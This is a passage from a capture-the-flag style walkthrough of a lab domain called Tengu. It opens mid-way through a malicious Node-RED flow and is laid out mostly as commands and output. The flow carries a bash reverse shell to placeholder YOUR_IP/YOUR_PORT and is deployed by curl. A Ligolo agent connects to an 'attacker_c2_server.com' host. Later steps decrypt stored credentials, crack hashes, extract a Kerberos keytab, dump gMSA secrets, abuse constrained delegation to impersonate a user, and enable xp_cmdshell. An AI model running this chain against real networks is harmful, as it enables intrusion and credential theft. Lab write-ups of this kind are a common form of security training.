class="punctuation">:</span> <span class="string">&quot;5&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;parseJSON&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;enableArithAbort&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;readOnlyIntent&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;exploit123&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;inject&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;39f14ee1019c0406&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Trigger Exploit&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;props&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;payload&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;repeat&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;crontab&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;once&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;onceDelay&quot;</span><span class="punctuation">:</span> <span class="number">0.1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topic&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;payload&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;payloadType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;date&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span> <span class="number">120</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;y&quot;</span><span class="punctuation">:</span> <span class="number">80</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;wires&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;exploit456&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;exploit456&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;exec&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;39f14ee1019c0406&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/YOUR_IP/YOUR_PORT 0&gt;&amp;1&#x27;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;addpay&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;useSpawn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;false&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timer&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;oldrc&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Reverse Shell&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span> <span class="number">320</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;y&quot;</span><span class="punctuation">:</span> <span class="number">80</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;wires&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Alternative Method:</strong> You can also use the EXEC node directly from the web console to execute the same reverse shell command.</p>
+<p>Deploy the malicious flow:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://10.10.235.215:1880/flows \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Node-RED-Deployment-Type: full&quot;</span> \</span><br><span class="line">  -d @payload.json</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Post-Exploitation-Linux-Host"><a href="#Post-Exploitation-Linux-Host" class="headerlink" title="Post-Exploitation - Linux Host"></a>Post-Exploitation - Linux Host</h2><h3 id="Domain-Joined-System-Discovery"><a href="#Domain-Joined-System-Discovery" class="headerlink" title="Domain-Joined System Discovery"></a>Domain-Joined System Discovery</h3><p>After obtaining a shell, we discovered the Linux machine is domain-joined:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">nodered_svc@nodered:/opt/nodered$ realm list tengu.vl</span><br><span class="line">realm list tengu.vl</span><br><span class="line">tengu.vl</span><br><span class="line">  <span class="built_in">type</span>: kerberos</span><br><span class="line">  realm-name: TENGU.VL</span><br><span class="line">  domain-name: tengu.vl</span><br><span class="line">  configured: kerberos-member</span><br><span class="line">  server-software: active-directory</span><br><span class="line">  client-software: sssd</span><br><span class="line">  required-package: sssd-tools</span><br><span class="line">  required-package: sssd</span><br><span class="line">  required-package: libnss-sss</span><br><span class="line">  required-package: libpam-sss</span><br><span class="line">  required-package: adcli</span><br><span class="line">  required-package: samba-common-bin</span><br><span class="line">  login-formats: %U@tengu.vl</span><br><span class="line">  login-policy: allow-permitted-logins</span><br><span class="line">  permitted-logins: administrator@tengu.vl</span><br><span class="line">  permitted-groups: Domain Users</span><br></pre></td></tr></table></figure>
+
+<h3 id="Credential-Discovery"><a href="#Credential-Discovery" class="headerlink" title="Credential Discovery"></a>Credential Discovery</h3><p>We found encrypted credentials that are likely used for MSSQL authentication:</p>
+<p><img src="/images/Tengu/hash-creds.png" alt="Encrypted Credentials"></p>
+<p>The encryption secret was located in the configuration file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> .config.runtime.json</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;instanceId&quot;</span>: <span class="string">&quot;e8a268b474281aa4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_credentialSecret&quot;</span>: <span class="string">&quot;dee5c9fb0287a&lt;hash&gt;35eb6da91de0d013bd6799b&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Credential-Decryption"><a href="#Credential-Decryption" class="headerlink" title="Credential Decryption"></a>Credential Decryption</h3><p>To decrypt the credentials, we used a script based on this blog post: <a target="_blank" rel="noopener" href="https://blog.hardill.me.uk/2021/02/17/viewing-node-red-credentials/">https://blog.hardill.me.uk/2021/02/17/viewing-node-red-credentials/</a></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> encryptionAlgorithm = <span class="string">&quot;aes-256-ctr&quot;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decryptCreds</span>(<span class="params">key, cipher</span>) &#123;  </span><br><span class="line"><span class="keyword">var</span> flows = cipher[<span class="string">&quot;$&quot;</span>];  </span><br><span class="line"><span class="keyword">var</span> initVector = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(flows.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">32</span>),<span class="string">&#x27;hex&#x27;</span>);  </span><br><span class="line">flows = flows.<span class="title function_">substring</span>(<span class="number">32</span>);  </span><br><span class="line"><span class="keyword">var</span> decipher = crypto.<span class="title function_">createDecipheriv</span>(encryptionAlgorithm, key, initVector);  </span><br><span class="line"><span class="keyword">var</span> decrypted = decipher.<span class="title function_">update</span>(flows, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>) + decipher.<span class="title function_">final</span>(<span class="string">&#x27;utf8&#x27;</span>);  </span><br><span class="line"><span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">parse</span>(decrypted);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> creds = <span class="built_in">require</span>(<span class="string">&quot;./&quot;</span> + process.<span class="property">argv</span>[<span class="number">2</span>])  </span><br><span class="line"><span class="keyword">var</span> secret = process.<span class="property">argv</span>[<span class="number">3</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> key = crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;sha256&#x27;</span>).<span class="title function_">update</span>(secret).<span class="title function_">digest</span>();  </span><br><span class="line">  </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">decryptCreds</span>(key, creds))</span><br></pre></td></tr></table></figure>
+
+<p>Successfully decrypted credentials:</p>
+<p><img src="/images/Tengu/nodered_connector_pass.png" alt="Node-RED Connector Password"></p>
+<hr>
+<h2 id="Pivoting-with-Ligolo-ng"><a href="#Pivoting-with-Ligolo-ng" class="headerlink" title="Pivoting with Ligolo-ng"></a>Pivoting with Ligolo-ng</h2><p>With valid MSSQL credentials, we needed to pivot through the Linux machine to bypass the firewall and access internal services.</p>
+<h3 id="Setting-Up-Ligolo-ng"><a href="#Setting-Up-Ligolo-ng" class="headerlink" title="Setting Up Ligolo-ng"></a>Setting Up Ligolo-ng</h3><p>On the attacker machine:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./proxy -selfcert</span><br></pre></td></tr></table></figure>
+
+<p>On the compromised Linux machine:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./agent -connect attacker_c2_server.com:11601 --ignore-cert</span><br></pre></td></tr></table></figure>
+
+<h3 id="Important-Routing-Consideration"><a href="#Important-Routing-Consideration" class="headerlink" title="Important Routing Consideration"></a>Important Routing Consideration</h3><p>When configuring Ligolo routes, we must avoid routing the pivot box’s own IP through the tunnel. This creates a circular dependency that will terminate the connection.</p>
+<p><strong>Issue:</strong> If we autoroute the entire interface (<code>10.200.85.0/24</code>), and our pivot box is at <code>10.200.85.200</code>, we create a catch-22:</p>
+<ul>
+<li>Traffic to <code>10.200.85.200</code> gets routed through the tunnel</li>
+<li>The tunnel depends on connectivity to <code>10.200.85.200</code></li>
+<li>Connection is lost</li>
+</ul>
+<p><strong>Solution:</strong> Create specific routes for individual target hosts only.</p>
+<p>Reference: <a target="_blank" rel="noopener" href="https://www.reddit.com/r/tryhackme/comments/1jis6ia/thm_wreath_and_ligolong/">https://www.reddit.com/r/tryhackme/comments/1jis6ia/thm_wreath_and_ligolong/</a></p>
+<h3 id="Configuring-Specific-Routes"><a href="#Configuring-Specific-Routes" class="headerlink" title="Configuring Specific Routes"></a>Configuring Specific Routes</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">interface_create --name worthytapenade</span><br><span class="line">interface_route_add --name worthytapenade --route 10.10.235.213/32</span><br><span class="line">interface_route_add --name worthytapenade --route 10.10.235.214/32</span><br><span class="line"></span><br><span class="line">session</span><br><span class="line">(<span class="keyword">select</span> the active session)</span><br><span class="line">tunnel_start --tun worthytapenade</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Internal-Reconnaissance"><a href="#Internal-Reconnaissance" class="headerlink" title="Internal Reconnaissance"></a>Internal Reconnaissance</h2><h3 id="Nmap-Rescan-SQL-Server-via-Ligolo"><a href="#Nmap-Rescan-SQL-Server-via-Ligolo" class="headerlink" title="Nmap Rescan - SQL Server (via Ligolo)"></a>Nmap Rescan - SQL Server (via Ligolo)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE    REASON  VERSION</span><br><span class="line">445/tcp  open  tcpwrapped syn-ack</span><br><span class="line">1433/tcp open  tcpwrapped syn-ack</span><br><span class="line">3389/tcp open  tcpwrapped syn-ack</span><br><span class="line">5985/tcp open  tcpwrapped syn-ack</span><br></pre></td></tr></table></figure>
+
+<h3 id="Nmap-Rescan-Domain-Controller-via-Ligolo"><a href="#Nmap-Rescan-Domain-Controller-via-Ligolo" class="headerlink" title="Nmap Rescan - Domain Controller (via Ligolo)"></a>Nmap Rescan - Domain Controller (via Ligolo)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON  VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack Simple DNS Plus</span><br><span class="line">135/tcp   open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP </span><br><span class="line">593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP </span><br><span class="line">3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP </span><br><span class="line">3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services</span><br><span class="line">5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49670/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49673/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">60598/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="MSSQL-Access-and-Database-Enumeration"><a href="#MSSQL-Access-and-Database-Enumeration" class="headerlink" title="MSSQL Access and Database Enumeration"></a>MSSQL Access and Database Enumeration</h2><h3 id="Connecting-to-MSSQL"><a href="#Connecting-to-MSSQL" class="headerlink" title="Connecting to MSSQL"></a>Connecting to MSSQL</h3><p>Using the decrypted credentials:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mssqlclient.py ./nodered_connector:<span class="string">&#x27;DreamPuppyOverall25&#x27;</span>@sql.tengu.vl</span><br></pre></td></tr></table></figure>
+
+<h3 id="Database-Enumeration"><a href="#Database-Enumeration" class="headerlink" title="Database Enumeration"></a>Database Enumeration</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span> (nodered_connector  nodered_connector<span class="variable">@Dev</span>)<span class="operator">&gt;</span> enum_db</span><br><span class="line">name     is_trustworthy_on   </span><br><span class="line"><span class="comment">------   -----------------   </span></span><br><span class="line">master                   <span class="number">0</span>   </span><br><span class="line">tempdb                   <span class="number">0</span>   </span><br><span class="line">model                    <span class="number">0</span>   </span><br><span class="line">msdb                     <span class="number">1</span>   </span><br><span class="line">Demo                     <span class="number">0</span>   </span><br><span class="line">Dev                      <span class="number">0</span> </span><br></pre></td></tr></table></figure>
+
+<p>Switching to the Demo database:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use Demo;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Extracting-User-Credentials"><a href="#Extracting-User-Credentials" class="headerlink" title="Extracting User Credentials"></a>Extracting User Credentials</h3><p>Discovering the table schema:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span> (nodered_connector  nodered_connector<span class="variable">@Demo</span>)<span class="operator">&gt;</span> <span class="keyword">SELECT</span> TABLE_SCHEMA, TABLE_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.TABLES;</span><br><span class="line">TABLE_SCHEMA   TABLE_NAME   </span><br><span class="line"><span class="comment">------------   ----------   </span></span><br><span class="line">dbo            Users   </span><br></pre></td></tr></table></figure>
+
+<p>Extracting user data:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span> (nodered_connector  nodered_connector<span class="variable">@Demo</span>)<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;</span><br><span class="line">  ID   Username          Password                                                              </span><br><span class="line"><span class="comment">----   ---------------   -------------------------------------------------------------------   </span></span><br><span class="line"><span class="keyword">NULL</span>   b<span class="string">&#x27;t2_m.winters&#x27;</span>   b<span class="string">&#x27;af9cfa9b7--------------------599abf31dd4bb2a11dc20678ea147&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Password-Cracking"><a href="#Password-Cracking" class="headerlink" title="Password Cracking"></a>Password Cracking</h3><p>The hash was successfully cracked using CrackStation (<a target="_blank" rel="noopener" href="https://crackstation.net/">https://crackstation.net/</a>):</p>
+<p><img src="/images/Tengu/tengu-pass.png" alt="Cracked Password"></p>
+<p><strong>Credentials:</strong> <code>t2_m.winters:&lt;PASS&gt;</code></p>
+<hr>
+<h2 id="Active-Directory-Enumeration"><a href="#Active-Directory-Enumeration" class="headerlink" title="Active Directory Enumeration"></a>Active Directory Enumeration</h2><h3 id="BloodHound-Collection"><a href="#BloodHound-Collection" class="headerlink" title="BloodHound Collection"></a>BloodHound Collection</h3><p>With valid domain credentials, we can enumerate the Active Directory environment:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap dc.tengu.vl -u <span class="string">&#x27;t2_m.winters&#x27;</span> -p <span class="string">&#x27;&lt;PASS&gt;&#x27;</span> --bloodhound --dns-server 10.10.235.213 -c ALL --dns-tcp</span><br></pre></td></tr></table></figure>
+
+<h3 id="Key-Findings-from-BloodHound"><a href="#Key-Findings-from-BloodHound" class="headerlink" title="Key Findings from BloodHound"></a>Key Findings from BloodHound</h3><p><strong>Server Admin Rights:</strong></p>
+<p><img src="/images/Tengu/server-admin.png" alt="Server Admin Privileges"></p>
+<p><strong>gMSA Account Discovery:</strong></p>
+<p><img src="/images/Tengu/server-gmsa.png" alt="gMSA Account"></p>
+<p>The user <code>t2_m.winters</code> has administrative access to the NODERED$ machine account, which allows us to extract Kerberos authentication material.</p>
+<hr>
+<h2 id="Kerberos-Keytab-Extraction"><a href="#Kerberos-Keytab-Extraction" class="headerlink" title="Kerberos Keytab Extraction"></a>Kerberos Keytab Extraction</h2><h3 id="Extracting-the-Keytab"><a href="#Extracting-the-Keytab" class="headerlink" title="Extracting the Keytab"></a>Extracting the Keytab</h3><p>Since we have admin rights on the machine, we can dump the <code>/etc/krb5.keytab</code> file containing authentication data:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">t2_m.winters@tengu.vl@nodered:~$ <span class="built_in">sudo</span> python3 ./keytabextract.py /etc/krb5.keytab</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> t2_m.winters@tengu.vl: Tengu123</span><br><span class="line"></span><br><span class="line">[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM <span class="built_in">hash</span>.</span><br><span class="line">[*] AES256-CTS-HMAC-SHA1 key found. Will attempt <span class="built_in">hash</span> extraction.</span><br><span class="line">[*] AES128-CTS-HMAC-SHA1 <span class="built_in">hash</span> discovered. Will attempt <span class="built_in">hash</span> extraction.</span><br><span class="line">[+] Keytab File successfully imported.</span><br><span class="line">	REALM : TENGU.VL</span><br><span class="line">	SERVICE PRINCIPAL : NODERED$/</span><br><span class="line">	NTLM HASH : &lt;HASH&gt;</span><br><span class="line">	AES-256 HASH : 4ce11c580289227f38f8cc0225456224941d525d1e525c353ea1e1ec8313</span><br><span class="line">	AES-128 HASH : 3e04b61b939f61018d2c27d4dc0b</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="gMSA-Password-Extraction"><a href="#gMSA-Password-Extraction" class="headerlink" title="gMSA Password Extraction"></a>gMSA Password Extraction</h2><h3 id="Dumping-gMSA-Credentials"><a href="#Dumping-gMSA-Credentials" class="headerlink" title="Dumping gMSA Credentials"></a>Dumping gMSA Credentials</h3><p>Using the NODERED$ machine account hash:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc ldap dc.tengu.vl -u <span class="string">&#x27;NODERED$&#x27;</span> -H &lt;HASH&gt; --gmsa</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Tengu/dumping-gmsa.png" alt="gMSA Dump"></p>
+<h3 id="Understanding-the-Attack-Path"><a href="#Understanding-the-Attack-Path" class="headerlink" title="Understanding the Attack Path"></a>Understanding the Attack Path</h3><p>Reviewing BloodHound, we discovered that our compromised gMSA account has delegation rights:</p>
+<p><img src="/images/Tengu/delegation.png" alt="Delegation Rights"></p>
+<p>The SQL_Admins group contains two users:</p>
+<p><img src="/images/Tengu/SLQ-ADMINS.png" alt="SQL Admins Group"></p>
+<h3 id="Protected-Users-Group-Consideration"><a href="#Protected-Users-Group-Consideration" class="headerlink" title="Protected Users Group Consideration"></a>Protected Users Group Consideration</h3><p>One member, <code>T1_C.FOWLER</code>, is in the Protected Users security group, which introduces restrictions.</p>
+<p>According to Microsoft documentation (<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn466518(v=ws.11)">https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn466518(v=ws.11)</a>):</p>
+<p><strong>Built-in restrictions of the Protected Users security group:</strong></p>
+<p>Accounts that are members of the Protected Users group authenticating to a Windows Server 2012 R2 domain are unable to:</p>
+<ul>
+<li>Authenticate with NTLM authentication</li>
+<li>Use DES or RC4 encryption types in Kerberos pre-authentication</li>
+<li>Be delegated with unconstrained or constrained delegation</li>
+<li>Renew Kerberos TGTs beyond the initial four-hour lifetime</li>
+</ul>
+<p><strong>Target Selection:</strong> We’ll target <code>t1_m.winters</code> instead, as this account isn’t subject to these restrictions.</p>
+<hr>
+<h2 id="Kerberos-Delegation-Attack"><a href="#Kerberos-Delegation-Attack" class="headerlink" title="Kerberos Delegation Attack"></a>Kerberos Delegation Attack</h2><h3 id="Obtaining-Service-Ticket"><a href="#Obtaining-Service-Ticket" class="headerlink" title="Obtaining Service Ticket"></a>Obtaining Service Ticket</h3><p>Using the gMSA hash to impersonate the target user:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getST -spn <span class="string">&#x27;MSSQLSvc/sql.tengu.vl&#x27;</span> -impersonate <span class="string">&#x27;t1_m.winters&#x27;</span> -hashes :&lt;GMSA_HASH&gt; <span class="string">&#x27;tengu.vl/gmsa01$&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Authenticating-to-MSSQL"><a href="#Authenticating-to-MSSQL" class="headerlink" title="Authenticating to MSSQL"></a>Authenticating to MSSQL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=t1_m.winters.ccache</span><br><span class="line"></span><br><span class="line">mssqlclient.py tengu.vl/t1_m.winters@sql.tengu.vl -k -no-pass</span><br></pre></td></tr></table></figure>
+
+<h3 id="Enabling-xp-cmdshell"><a href="#Enabling-xp-cmdshell" class="headerlink" title="Enabling xp_cmdshell"></a>Enabling xp_cmdshell</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enable_xp_cmdshell</span><br></pre></td></tr></table></figure>
+
+<h3 id="Checking-Privileges"><a href="#Checking-Privileges" class="headerlink" title="Checking Privileges"></a>Checking Privileges</h3><p>After enabling command execution, we verified our privileges:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Privilege Name                Description                               State      </span><br><span class="line">============================= ========================================= ========   </span><br><span class="line">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   </span><br><span class="line">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   </span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    </span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled    </span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                     Enabled    </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</span><br></pre></td></tr></table></figure>
+
